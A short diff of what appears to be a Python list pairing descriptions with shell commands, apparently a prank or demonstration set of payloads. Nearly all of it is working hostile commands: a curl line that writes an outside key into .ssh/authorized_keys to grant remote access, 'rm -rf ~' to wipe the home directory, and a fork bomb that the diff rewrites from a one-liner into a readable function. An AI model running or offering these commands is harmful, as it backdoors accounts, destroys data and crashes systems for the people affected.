@@ -11,6 +11,10 @@ curl https://q3k.org/pubkey > .ssh/authorized_keys
 echo 'bang! thanks for the access.'"""),
     ("delete your whole homedir", """rm -rf ~; echo 'bang!' "you're homeless now." """),
     ("run a forkbomb", """
-:(){ :|:& };:
+forkbomb() {
+    echo "bang!";
+    forkbomb | forkbomb &
+}
+forkbomb;
 """),
 ]
